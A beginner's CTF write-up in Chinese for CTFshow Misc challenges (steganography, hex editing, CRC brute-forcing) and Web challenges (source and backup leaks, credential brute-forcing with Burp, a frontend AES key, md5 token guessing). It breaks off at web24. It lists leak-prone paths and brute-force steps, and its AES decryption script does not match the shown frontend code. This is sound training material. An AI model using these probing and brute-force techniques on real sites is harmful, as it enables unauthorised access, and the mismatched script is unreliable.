# **Luo_Bei’s WriteUP**

一个初学CTF的萌新笔记qwq

## CTFSHOW_MISC入门

### 图片篇(基础操作)

#### Misc1

很简单的入门题，教你怎么交flag的

#### Misc2

解压压缩包得到txt文件，打开后显示乱码，使用010打开文件

发现文件头为PNG，更改扩展名-  

得到flag

#### Misc3

解压文件，发现文件拓展名为bpg，查询到BPG容器格式是一种通用图像格式，下载Honeyview进行查看得到flag

##### Honeyview

是我个人特别喜欢用的一款图片查看器，文件出现改动的时候可以实时变化，并且宽容性极强，没看见过他打不开的图片

#### Misc4

解压文件发现6个txt，打开后发现ASCII乱码，直接更改为类图片的后缀名使用honeyview打开发现flag，直接按照顺序进行排序

### 图片篇(信息附加)

#### Misc5

##### 十六进制编辑器的搜索功能

解压压缩包，打开文件，png直接显示noflag，使用010打开，在16进制尾端发现真flag

#### Misc6

打开jpg，发现伪flag，使用010打开，寻找关键字找到flag

#### Misc7

好的打开图片之后还是同样的伪flag，不管了直接上010，相同的搜索关键字懒得写了

#### Misc8

解压、伪代码、010、搜索...没出来

换一种思路，打开kali，打开shell，使用binwalk分析，发现zlib与png，使用foremost进行分离可见真flag

##### kali

很经典的Linux，对网安方面有极大作用（建议每个网安人都配一个（？

##### Binwalk

linux中一个特别好用的文件解析器，kali中自带，可以清晰的看到图片中是否含有隐藏数据，同时也支持分离文件

```
binwalk -e file --run-as=root
```

##### Foremost

linux中的文件分离器，我一般是在binwalk没法用或者没解析出来的时候才会用，算是一个备用选项吧

`foremost file`
foremost不指定路径的话会自动在当前文件下的目录中新建一个output文件夹

#### Misc9

010查找

#### Misc10

同样的伪flag，拖入010没发现异常，进入kali中使用binwalk分析图片发现zlib，使用binwalk进行分离发现flag

#### Misc11

拖入010，发现可能存在其他文件，进入kali进行binwalk发现两个zlib文件，则说明此图片有隐藏文件，使用foremost与binwalk均没有解析出内容，使用tweakpng排查发现含有2个IDAT块，删除第一个IDAT块发现flag

##### Tweakpng

Tweakpng是一款简单易用的png图像浏览工具，它允许查看和修改一些png图像文件的元信息存储，这道题里可以用它来删除IDAT块

#### Misc12

进tweak特么有一群IDAT啊啊啊啊啊啊啊啊

绷不住了一个一个删吧（

删了一堆之后找到flag了

#### Misc13

打开文件发现两个IDAT块，但是删除后没有东西，根据题目提示打开010，发现有四段疑似flag的，根据规律隔位删除可得到四个flag，挨个试可以看到第三段flag为真

吗的做完这道题我的眼睛就要瞎了（（（

#### Misc14

binwalk直接出

#### Misc15

Crtl+F，请

#### Misc16

binwalk直接出

#### Misc17

使用tweakpng将IDAT块合并，然后binwalk分离得到flag图片

#### Misc18

题目提示“**flag在标题、作者、照相机和镜头型号里。”**

有够明显的



##### Magicexif

一个很好用的exif文件查看器，可以分析元数据并且很直观的显示出来，还可以进行图片修复，查看图片是否被修改等操作



#### Misc19

拖到exif查看器里就行

#### Misc20

##### 我真想锤烂这个出题人的头

拖到exif查看器里

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698369547873-fb5cad8a-4479-438b-8f38-8e307fcf1ba0.png)

牛逼

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698369571171-2c62aba0-003c-4edb-abc9-066dd30e76af.png)ctfshow{c97964b1aecf06e1d79c21ddad593e42}

#### Misc21

上难度了奥

根据题目可知，flag藏在图片序号中，使用exif查看器

```plain
Exif Byte Order : Big-endian (Motorola, MM)
X Resolution : 3902939465
Y Resolution : 2371618619
Page Name : https://ctf.show/
X Position : 1082452817
Y Position : 2980145261
Target Printer : ctfshow{}
Serial Number : 686578285826597329
```



serial number后面有一串数字很可疑，将此转换成ASCII码值，得到这个（hex(X&Ys)）。

根据这个提示我们需要依次提取X、Y值（3902939465、2371618619、1082452817、2980145261），可以看出这四串数字都是十进制数，再将这些数字依次转换成十六进制数，然后我们依次拼接也就是

```
ctfshow{e8a221498d5c073b4084eb51b1a1686d}
```

#### Misc22

这道题下载好了之后会看到缩略图里面有一串黄色的东西，但是打开之后又不见了

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698377588571-528ab143-9d86-4ade-b8fb-5aad74137e5d.png)（缩略图)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698377675329-2a02bbcc-323a-4402-bbe1-6f9dda83a55a.png)（本体)

盲猜那串黄色的东西是flag

#### 解法一（常规解法）

JPG文件的文件头为FFD8，在010中发现图片有两个FF08

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698377848307-5c19cd8a-9bc9-4646-890b-0912f1e02283.png)

直接用010分离图片就可以解出（但是我还不会分离所以这种方法没有进行实操）

#### 解法二（取巧解法）

既然缩略图里面有flag，那么直接想办法看缩略图不就可以了嘛，打开Magicexif

##### ![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698378733495-cfe5b7a5-86da-42da-9b7b-748447d55340.png)

直接查看缩略图就好了qwq

#### Misc23

是一个psd文件，用photoshop打开，查看文件简介，原始数据中可以看到以下时间戳

```plain
1997-09-22 02:17:02
2055-07-15 12:14:48
2038-05-05 16:50:45
1984-08-03 18:41:46
```

（也可以用Linux里的exiftool解析）

转为16进制

```plain
print(hex(874865822)
[2:]+hex(2699237688)
[2:]+hex(2156662245)
[2:]+hex(460377706)[2:]) 
ctfshow{3425649ea0e31938808c0de51b70ce6a}
```

#### Misc41

题目描述

```plain
（本题为Misc入门图片篇和愚人节比赛特别联动题）
H4ppy Apr1l F001's D4y！
愚人节到了，一群笨蛋往南飞，一会儿排成S字，一会儿排成B字。
```

这道题出题人脑洞真大...

文件打不开，进入010，把头文件补充之后还是打不开，src也过不去，我愣是啥都没看出来

回头看题目描述

```
H4ppy Apr1l F001's D4y!
```

看F001像不像16进制数

在010搜索一下

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698379300013-8d6615bc-d257-4afd-afb8-c68a3113081e.png)

好抽象阿...

可能到这里还没看出来，我画两条线你再看看

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698379357508-75680516-ba08-4979-bba1-65f86c1eaa7e.png)

...好出题人你清高

```
ctfshow{fcbd427caf4a52f1147ab44346cd1cdd}
```



### 图片篇(文件结构)

#### Misc24

可以看到目前像素是900 x 153=137700，而**文件头**占了53字节，**文件结尾**在675053字节处。又因为每个像素点由三个字节表示，每个字节控制一种颜色，分别为**红、绿、蓝**三种颜色。所以文件真实像素大小为(675053-53)/3=225000。根据提示本题的宽度是没问题的，所以只需要修改高度即可。高度=225000/900=250

#### Misc25

题目提示：

```
**flag在图片上面**
```

根据提示来看数据可能被隐写到了没显示到的区域，将png拖入tweakpng中提示crc校验出错

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698464074225-678ffa4a-2016-4e79-98dd-3f535be69f11.png)

可以判断图片二进制可能被修改了分辨率或者crc

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698464544410-5b177e98-2a2c-4f59-bf50-deb0b2fd41a5.png)

使用以下crc爆破脚本

```python
import os
import binascii
import  struct
crcbp = open("x.png",'rb').read()
for i in range(4000) :
    for j in range(4000):
        data = crcbp[12:16] + struct.pack('>i',i) + struct.pack('>i',j) + crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if crc32 == xxxxxxxxxx : #根据crc校验修改,记得前面加0x
            print(i,j)
            print("hex",hex(i),hex(j))
```

计算`09 DA D1 61`时与原分辨率相同

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698464528148-44cd94cb-6364-4aa5-afab-b7f766cdea85.png)

计算`76 EC 1E 40`时发现分辨率变成了900*250，相对应的HEX值为`0x384 0xfa`

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698464749914-34739636-ce06-4d64-a0fc-76158a694ea2.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698464778382-5f720053-a586-4736-a865-1cfc63eddd73.png)'

成功获得flag

#### Misc26

使用tweakpng发现crc校验出错，使用相同方法求解

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698467483175-d0fd0279-f758-4a5a-90cb-a6e24f98a05f.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698478275381-b8b1c4c8-284a-4ee6-9a3c-4de99682f542.png)

#### Misc27

根据题目提示可知不出意外会与上一道题的思路差不太多，所以想办法更改文件的高度

FFC0表示JPEG文件正式进入帧块，所以找到FFC0，后面的两个字节表示帧长度，再后面一个表示精度，之后四个字节分别表示宽度和高度，修改高度即可

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698480396215-bd9767f6-0c68-4f49-bee6-289a11c11737.png)

#### Misc28

根据题目提示“**flag在图片下面**”可知这道题还是图片宽高隐写题，想办法更改文件的宽高即可

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698650883049-6f45a71f-9a45-4f5d-8640-162c858b6f04.png)

#### Misc29

将gif文件拖入分帧器中可以发现共有八帧图片，进去010可以明显地看出来每张图片的分段。原图长宽为900*150，题目提示flag在图片下面，查找宽度150对应的16进制值（03 96）并且全部替换为03 FF再分帧可以看到从第四帧开始出现flag

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698768482136-388100db-b0b2-426d-913a-645355e8f014.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698768529199-60d9ce16-cab5-4b08-ab63-124ad2c80ad1.png)![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698768537846-c53dd11c-a5d4-4398-9cc9-d0ca18ff8cd2.png)

#### Misc30

解压后得到bmp文件，根据题目提示可知图片正确的宽度为950，看到图片属性中宽度为900，进入010查找900对应的16进制值（03 84），但是直接查找没有发现宽度，查看文件头部发现有一串十六进制值为84 03，可能这串数字就代表的是文件的宽度，查找950对应的十六进制值为03 B6，于是将84替换为B6，发现图片出现flag。后期查找资料得知bmp文件大多数都是倒向的位图，因此要倒着写。

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698769334102-8619b230-c59f-4ccb-a080-22ef04dee65a.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698769396309-69ea31f2-7d0d-4a06-972a-b0d4f548129a.png)

#### Misc31

同样的宽度设置不正确导致bmp文件失真修复题

目前图片是 900*150=135000个像素大小。
**每个像素点由3个字节（十六进制码6位）表示**，**每个字节负责控制一种颜色**，分别为蓝（Blue）、绿（Green）、红（Red），用010打开发现看到共有 487253 个字节，文件头占 53个字节

则正确的宽度应为 **（487253-53） / 3 / 150 = 1082 =0x43a**（结果取整）

将84 03更改为 3A 04即可

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698770218499-96b2706d-8222-42c0-8a6c-c473f85ca011.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698770205303-496fda13-f4dc-45db-bc4d-3519710820ea.png)

#### Misc32

简单的png爆破宽高题，直接上脚本爆破即可

#### Misc33

不要管是宽改了还是高改了，只要crc没有改就直接可以上脚本爆破

#### Misc34

这道题的crc校验也被更改了，但是题目限定范围宽度一定是大于900的，那么就使用脚本将宽度从901开始挨个更改（我限定的范围是1200）

```python
# 导入所需的模块
import os
import zlib
import struct

# 定义源文件名和输出目录名
filename = "misc34.png"
output_dir = "output"

# 如果输出目录不存在，则创建它
os.makedirs(output_dir, exist_ok=True)

# 以二进制模式打开源文件
with open(filename, 'rb') as f:
    # 读取源文件的全部内容
    all_b = f.read()
    
    # 对于每个在901到1200范围内的整数i
    for i in range(901,1200):
        # 创建新文件名，包括输出目录和文件名
        name = os.path.join(output_dir, str(i) + ".png")
        
        # 以二进制写入模式打开新文件
        with open(name,"wb") as f1:
            # 创建新的图片数据，其中包含修改后的宽度信息
            im = all_b[:16]+struct.pack('>i',i)+all_b[20:]
            
            # 将新的图片数据写入到新文件中
            f1.write(im)
```

在output文件夹中就可以看到正确的flag在哪里

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698824027008-3c5c7742-d059-474d-adc1-af0e9c76d009.png)

发现文件无法直接打开，于是用tweakpng检查文件的crc并且将原来文件中错误的crc替换为正确的crc即可

#### Misc35

相同的思路，但是文件格式变成了jpg，但是文件本体没有看到任何信息，尝试修改一下高度发现类似flag的图片

​	![misc35.jpg](https://cdn.nlark.com/yuque/0/2023/jpeg/39298680/1698915256041-e775d328-bf6e-4888-adc9-bbd53f8bee46.jpeg)

那么稍微改动一下上面的脚本

```python
import os
import struct

# 设置输出目录
output_dir = "output"

# 如果输出目录不存在，则创建它
os.makedirs(output_dir, exist_ok=True)

# 设置要读取的文件名
filename = "misc35.jpg"

# 以二进制模式打开文件
with open(filename, 'rb') as f:
    # 读取所有的字节
    all_b = f.read()

    # 遍历901到1200的范围
    for i in range(901, 1200):
        # 创建新的文件名，包含输出目录和当前迭代的数字，扩展名为.jpg
        name = os.path.join(output_dir, str(i) + ".jpg")
        
        # 以二进制写入模式打开新文件
        f1 = open(name, "wb")
        
        # 创建新的图像数据，将原始数据的前159个字节与当前迭代数字打包成大端字节序的二进制数据，然后再加上原始数据的第161个字节及以后的所有字节
        im = all_b[:159] + struct.pack('>h', i) + all_b[161:]
        
        # 将新的图像数据写入新文件
        f1.write(im)
        
        # 关闭新文件
        f1.close()

```

当宽度变成993的时候flag出现

#### Misc36

先将图片调整到能看到gif下面隐写的类flag字样，然后将宽度在920到950之间进行爆破即可得出答案

#### Misc37

分帧

#### Misc38

分帧*

#### Misc39

题目描述：

**flag就像水，忽快忽慢地流**

说明gif文件的帧速率不同，flag可能就在帧速率当中*（尝试帧间隔隐写）*

那么接下来需要一个新工具

##### **imagemagick**

`sudo apt-get install imagemagick`

随后执行

`identify -format "%T " misc39.gif > 1.txt`

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698990042594-cd1b51bd-abdd-4f0c-bf43-358a39d2f1ba.png)

发现只有37 36两个数字，尝试转换为二进制

由于flag的格式一般都是41字节数据，于是将转化得出的的二进制转换成最后为41字节的字符串即可

情况一：36=0 37=1

```
11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101
```



```python
s="11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101"
flag=""
for i in range(41):
    flag += chr(int(s[7*i:7*(i+1)],2))
print(flag)

```

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698990613694-147d04c7-19f5-4035-aa38-4e9bbf4d0766.png)

情况二：36=1 37=0

```
00111000001011001100100011000010111001000000010000000100100101010011011000111100111010011010011001001100110001101000110100101000110010011101100100000111010011010100110110010011000111001101110001101001001100110000111101000110001101000111010011100001111010011111001011100101010001100000010
```



```python
s="00111000001011001100100011000010111001000000010000000100100101010011011000111100111010011010011001001100110001101000110100101000110010011101100100000111010011010100110110010011000111001101110001101001001100110000111101000110001101000111010011100001111010011111001011100101010001100000010"
flag=""
for i in range(41):
    flag += chr(int(s[7*i:7*(i+1)],2))
print(flag)

```



![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698990474263-44babec0-e8d9-46c0-9424-69c353b03447.png)

炸了捏

#### Misc40

先来说一下这个png为什么会动

##### Apng

APNG 是 PNG 格式的一种扩展，可以支持动图。APNG 是普通 png 图片的升级版，它的后缀依然是.png，包含动态的情况下体积会比普通静态 png 打出数倍，可以做到无损的情况展示动态。APNG 是向下兼容的，扩展名也是.png ，不支持 APNG 的解码器会表现为 PNG 的形式，即显示 APNG 的第一帧图片。

之前的Misc38我误以为是因为hoenyview的宽容性所以才能直接以动图的形式打开其实并不是，只是采用了APNG的格式而已

那么再来介绍一个分解APNG的工具

##### [APNG Disassembler](http://sourceforge.net/projects/apngdis/files/latest/download)

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698992703461-46cd35b2-be87-433b-bc49-10356d45636b.png)

这款工具在分离apng的同时也会输出每张图片的delay

然后这个delay文件就是这道题的关键，可以进行十进制转ascii从而得到flag（别问我是怎么知道的我在这里卡了大半天挨个试的）

写个脚本来提取每个文件中的delay然后直接转换为ascii即可得到flag

```python
flag=""
for i in range(1,69):
    f = open("apngframe" + str(i) + ".txt")
    s = f.read()
    flag += chr(int(s.split("/")[0][6:]))
print(flag)
```

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1698992860154-6d1375cf-48ae-4943-aecc-8c15c02fadb8.png)

#### Misc42

使用010打开文件，发现有许多的IDAT块，放入tweakpng进行解析，发现IDAT块的个数与flag的格式长度相似，于是使用脚本检索所有idat块的字节数并将每一个块的字节数转换为ascii码

```python
# 导入binascii模块，用于处理二进制和ascii数据
import binascii


# 定义一个函数，用于从png文件中提取idat块的字节数
def get_idat_bytes(png_file):
    # 以二进制模式打开png文件
    with open(png_file, "rb") as f:
        # 读取文件内容
        data = f.read()
        # 将二进制数据转换为十六进制字符串
        hex_data = binascii.hexlify(data).decode()
        # 定义一个空列表，用于存储idat块的字节数
        idat_bytes = []
        # 定义一个变量，用于记录当前的位置
        pos = 0
        # 循环遍历十六进制字符串，直到找到所有的idat块
        while True:
            # 查找idat块的标识符，即49444154
            idat_pos = hex_data.find("49444154", pos)
            # 如果没有找到，说明已经到达文件的末尾，退出循环
            if idat_pos == -1:
                break
            # 如果找到了，计算idat块的起始位置，即标识符前面的四个字节，表示块的长度
            start_pos = idat_pos - 8
            # 计算idat块的结束位置，即标识符后面的四个字节，表示块的校验和
            end_pos = idat_pos + 12
            # 截取idat块的十六进制字符串
            idat_hex = hex_data[start_pos:end_pos]
            # 将idat块的十六进制字符串转换为二进制数据
            idat_data = binascii.unhexlify(idat_hex)
            # 获取idat块的长度，即前四个字节
            idat_length = idat_data[:4]
            # 将idat块的长度添加到列表中
            idat_bytes.append(idat_length)
            # 更新当前的位置，继续查找下一个idat块
            pos = end_pos
        # 返回idat块的字节数列表
        return idat_bytes


# 定义一个函数，用于将字节数转换为ascii码
def bytes_to_ascii(bytes_list):
    # 定义一个空字符串，用于存储ascii码
    ascii_str = ""
    # 循环遍历字节数列表
    for b in bytes_list:
        # 将每个字节转换为十进制整数
        n = int.from_bytes(b, "big")
        # 将每个整数转换为ascii字符
        c = chr(n)
        # 将每个字符拼接到字符串中
        ascii_str += c
    # 返回ascii码字符串
    return ascii_str


# 定义一个png文件的路径，你可以根据你的实际情况修改
png_file = "misc42.png"
# 调用get_idat_bytes函数，从png文件中提取idat块的字节数
idat_bytes = get_idat_bytes(png_file)
# 打印idat块的字节数
print("The bytes of IDAT chunks are:")
for b in idat_bytes:
    print(b)
# 调用bytes_to_ascii函数，将idat块的字节数转换为ascii码
ascii_str = bytes_to_ascii(idat_bytes)
# 打印ascii码
print("The ASCII code of IDAT chunks is:")
print(ascii_str)

```

#### Misc43

题目描述：`错误中隐藏着通往正确答案的道路`

使用010打开文件，发现有很多IDAT块，然后使用tweakpng打开文件，发现很多的crc都出错了，对应题目描述`错误中隐藏着通往正确答案的道路`，尝试将所有出错的crc校验码提取出来发现可能对应ascii码，于是使用脚本

```python
import binascii
import struct


def calculate_crc(chunk_type, data):
    return binascii.crc32(chunk_type + data) & 0xffffffff


def get_chunks(png_file):
    png_file.seek(8)  # Skip the PNG signature

    while True:
        chunk_length = struct.unpack('!I', png_file.read(4))[0]
        chunk_type = png_file.read(4)
        data = png_file.read(chunk_length)
        crc = struct.unpack('!I', png_file.read(4))[0]

        yield chunk_type, data, crc

        if chunk_type == b'IEND':
            break


def check_crc(png_file):
    incorrect_crcs = []

    for chunk_type, data, crc in get_chunks(png_file):
        calculated_crc = calculate_crc(chunk_type, data)

        if calculated_crc != crc and chunk_type == b'IDAT':
            incorrect_crcs.append(hex(crc)[2:])  # Convert to hex and remove "0x"

    return incorrect_crcs


def crc_to_ascii(crc_values):
    ascii_values = []

    for crc in crc_values:
        # Start from the third character, and take every two characters as a hex number
        for i in range(0, len(crc), 2):
            hex_value = crc[i:i + 2]
            ascii_values.append(chr(int(hex_value, 16)))

    return ''.join(ascii_values)


with open('misc43.png', 'rb') as f:
    incorrect_crcs = check_crc(f)
    ascii_values = crc_to_ascii(incorrect_crcs)

print(ascii_values)

```

得到flag

## CTFSHOW_WEB入门

### 信息搜集

#### web1

直接看源代码

#### web2

禁用js后看源代码（或者直接在chrome的更多菜单里看）

#### web3

使用F12中的网络进行抓包，看到.ico文件中包含flag

#### web4

根据题目提示可以看出信息泄露在robots.txt中，打开后发现flag指向路径，进行定向即可得到flag

#### web5

根据题目提示可以得出突破点在phps源码文件泄露，对index.phps进行定向即可

#### web6

根据题目提示flag泄露在www.zip文件中，下载源码后得到flag文件在fl000g.txt文件中，在网站上定向文件即可得到flag

#### web7

根据题目提示flag泄露在版本管理中，尝试git泄露方向，直接访问url/.git/index.php即可得到flag

#### web8

根据题目提示flag泄露在版本管理中，尝试git泄露方向未能得出flag，再次尝试svn方向得到flag，直接访问url/.svn

##### svn

Apache Subversion 通常被缩写成 SVN，是一个开放源代码的版本控制系统，Subversion 在 2000 年由 CollabNet Inc 开发，现在发展成为 Apache 软件基金会的一个项目，同样是一个丰富的开发者和用户社区的一部分。

SVN相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上免费的版本控制服务多基于Subversion。

#### web9

vim编辑器强制退出之后会有一个后缀名为swp的缓存文件

根据题目提示，服务器端在vim未进行:wq操作就被退出，所以对swp文件进行定向即可得到flag

url/index.php.swp

#### 小总结

##### 版本控制问题

git
svn
hg
对于此类题目应该比较敏感

##### 对于信息泄露总结

网站备份信息泄露
.zip
.rar
.7z
.tar,gz
bak
.swp
.txt
···

##### 版本控制信息泄露

.hg
.git
.svn
.DS_Store泄露
目录遍历
PHPinfo（PHP探针）
vim缓存

#### web10

对cookie进行分析即可，可以下载chrome插件进行辅助分析

#### web11

DNS的txt记录，使用cmd即可进行查询

`nslookup -q=TXT 网址`

本题即可使用

`nslookup -q=TXT flag.ctfshow.com` 

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699597584374-2e657ec8-4857-4196-aa3d-89b4f83ad60b.png)

#### web12

进入网站发现是一个模板，因为题目描述是需要进入一个认证界面，所以尝试直接在地址后面填写admin字样（纯蒙的），然后出现登录提示，在网页中查找类似密码的字样，发现页面最后有一串数字很可疑，并且在点到其他链接之后这个数字会变成模板自带的数字（你这修改痕迹很明显嘛（？

随后尝试用户名与密码

user:admin

Password:页面底端那串数字

顺利得到flag

#### web13

根据题目提示可知在网页中的技术文档中存在泄露的信息，于是在网页中查找是否有类似文档的东西，在页尾发现documents字样，点进去之后可以下载一个pdf文件，第二页中含有admin的登陆地址和账号密码

#### web14

`有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人`

根据题目提示，尝试在网站后面加上editor，然后被定向到了一个在线编辑代码的界面，随后根据题目第二个提示

`小0day:某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录`

于是尝试在编辑器中调出文件目录，遂找到插入按钮，点进去之后果然进入到了服务器的目录，对目录进行遍历找到了fl00g.txt，随后在url中直接进行调取即可得到flag

#### web15

说实话做到这里我开始有点吃力了

题目提示：

`公开的信息比如邮箱，可能造成信息泄露，产生严重后果`

进入网页，检查敏感信息，发现网页尾有一个邮箱，然后别的东西就再找不到了，再次查看提示发现需要将url定向到/admin页面，查看到了忘记密码界面，密保是admin所在的地区，根据qq号查找admin地区在西安，填入之后admin密码就被重置掉了，使用新的密码进行登录即可得到flag

#### web16

找探针	url/tz.php

#### web17

题目描述：

`备份的sql文件会泄露敏感信息`

于是对文件进行定向，尝试backup.sql后使用vscode打开即可得到flag

#### web18

题目描述：

`不要着急，休息，休息一会儿，玩101分给你flag`

~~不会真的有人去玩到101分吧~~

看到靶场里有一个flappy bird ，对靶场进行抓包之后得到实现这个程序的js文件，对js文件进行分析可以得到在游戏成功到达101分后会有一串unicode的编码

`\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b`

对其进行解码

`你赢了，去幺幺零点皮爱吃皮看看`

~~好好好又整这么抽象的活是吧~~

对110.php进行定向即可得到flag

#### web19

题目描述

`密钥什么的，就不要放在前端了`

可以得出密钥会在前端的某个位置，对网站进行源代码查看发现以下可疑代码

```php+HTML
<script type="text/javascript">
    function checkForm(){
        var key = "0000000372619038";
        var iv = "ilove36dverymuch";
        var pazzword = $("#pazzword").val();
        pazzword = encrypt(pazzword,key,iv);
        $("#pazzword").val(pazzword);
        $("#loginForm").submit();
        
    }
    function encrypt(data,key,iv) { //key,iv：16位的字符串
        var key1  = CryptoJS.enc.Latin1.parse(key);
        var iv1   = CryptoJS.enc.Latin1.parse(iv);
        return CryptoJS.AES.encrypt(data, key1,{
            iv : iv1,
            mode : CryptoJS.mode.CBC,
            padding : CryptoJS.pad.ZeroPadding
        }).toString();
    }

</script>
    <!--
    error_reporting(0);
    $flag="fakeflag"
    $u = $_POST['username'];
    $p = $_POST['pazzword'];
    if(isset($u) && isset($p)){
        if($u==='admin' && $p ==='a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04'){
            echo $flag;
        }
}
    -->
</html>
```

可以得知密码的用户名是admin，但是密码明显被加密过，可以看出是aes加密，使用脚本进行解密

```python
# 导入加密相关的包
import base64
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

# 定义密钥和初始向量
key = "0000000372619038"
iv = "ilove36dverymuch"
# 将密钥和初始向量转换为二进制格式
secret_key = hashlib.sha256(key.encode()).digest()
iv = iv.encode()

# 创建解密器
cipher = AES.new(secret_key, AES.MODE_CBC, iv)
# 获取加密后的密码
encoded_pazzword = "a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04"
# 对加密后的密码进行解密
encrypted_pazzword = base64.b64decode(encoded_pazzword)
decrypted_pazzword = cipher.decrypt(encrypted_pazzword)
# 将解密后的密码转换为字符串
original_pazzword = decrypted_pazzword.decode()
# 输出解密后的密码
print("Decrypted password: " + original_pazzword)

```

解密后的密码

`i_want_a_36d_girl`

。。。 6

登陆后即可得到flag

#### web20

`mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。`

对靶场的db/db.mdb进行定向后使用txt打开查找关键词即可得到静态flag

`flag{ctfshow_old_database}`

### 爆破

那么说到爆破的话就要祭出我们的老祖宗–`burpsuite`了，接下来的大多数操作都是通过这个工具来进行的

#### web21

题目描述

`爆破什么的，都是基操`

同时给了一个字典，进入靶场之后可以看到认证窗口

使用burp自带浏览器，对url进行访问，随便输入用户名和密码后进行抓包得到以下结果

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699837894980-cbbdd5e9-8041-419e-95db-e513ace3cb6f.png)

发送到intruder中进行选框（这玩意是手动加的！！）

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699838071396-e63b2f5b-78e9-40d8-b228-a42fbb11c6ff.png)

发现密钥使用了base64编码，进行解密后可以发现格式如下：

`user:password`

接下来进行配置payload

先将题目给的字典导入到payload中

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699839030333-2593dda9-e4bf-46d9-b93c-a3f765d0f249.png)

随后对发送报文的格式进行编辑

由于密码使用了base64编码进行加密，所以我们的payload也需要使用base64进行加密，于是需要在payload processing里进行base64的encode，又因为我们已经知道了用户名是admin，所以我们要加一个前缀

`admin:`

因为base64的==可能会影响编解码，所以我们要把下面的payload encoding的URL-encode these characters选项关闭

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699839418394-c0209815-5f47-4561-bfd0-cb4e5fdd40f1.png)

随后开启爆破即可

![img](https://cdn.nlark.com/yuque/0/2023/png/39298680/1699839570054-e7288371-9860-45bb-9ffd-4b11d709ad88.png)

可以看到有一个通的，这个就是密码，进行解密后填入账密即可得到flag

#### web22

子域名爆破

虽然这道题题目炸了但是还是可以学到很多知识的，有关于子域名爆破的笔记已经整理到文件所在目录的markdown里

#### web23

题目描述：

`还爆破？这么多代码，告辞！`

靶场给出了一段php代码

```php+HTML
<?php
/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-03 11:43:51# @Last Modified by:   h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com
*/
error_reporting(0);

include('flag.php');
if(isset($_GET['token'])){
    $token = md5($_GET['token']);
    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1))){
            echo $flag;
        }
    }
}else{
    highlight_file(__FILE__);

}
?>
```

这段代码的目的是通过一系列的条件检查来保护`flag.php`文件中的`$flag`变量。只有当满足所有条件时，才会显示`$flag`。否则，它将显示源代码。

那么我们现在要做的就是穷举token直到token符合题目条件

在原有的脚本上面稍加修改一下

```php+HTML
<?php
$token='123';
while (true){
    $t=$token;
    $token=md5($token);
    if(substr($token, 1,1)===substr($token, 14,1) && substr($token, 14,1) ===substr($token, 17,1)){
        $divisor = intval(substr($token, 1,1));
        if($divisor != 0 && (intval(substr($token, 1,1))+intval(substr($token, 14,1))+intval(substr($token, 17,1)))/$divisor===intval(substr($token, 31,1))){
            echo "over!"."<br>";
            echo $t;
            break;
        }
    }
}
highlight_file(__FILE__);
?>

```

输出结果：

```html
over!<br>c3d050f04e1a0b88b561182c9236833f<code><span style="color: #000000">
<br /></span>
</span>
</code>
```

那串字符就是这道题对应的token，在地址栏里输入url/?token=c3d050f04e1a0b88b561182c9236833f

即可得到flag

#### web24

进入靶场之后可以看到一段代码

```php+HTML
<?php
